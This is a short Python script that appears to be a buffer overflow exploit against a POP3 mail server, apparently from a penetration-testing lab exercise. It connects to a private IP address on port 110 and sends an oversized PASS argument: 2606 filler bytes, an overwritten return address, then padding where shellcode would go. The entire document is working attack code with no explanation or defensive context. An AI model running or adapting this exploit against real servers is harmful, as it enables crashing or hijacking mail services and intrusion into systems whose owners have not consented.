#!/usr/bin/python
import socket

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

buffer = 'A'*2606 + '\x8f\x35\x4a\x5f' + 'C'*(2700-2606-4)

try:
	print "\n sending evil buffer..."
	s.connect(('10.11.5.115', 110))
	data = s.recv(1024)
	s.send('USER test\r\n')
	data = s.recv(1024)
	s.send('PASS '+buffer+'\r\n')
	print "\nDone!."
except:
	print "Could not connect to POP3!"
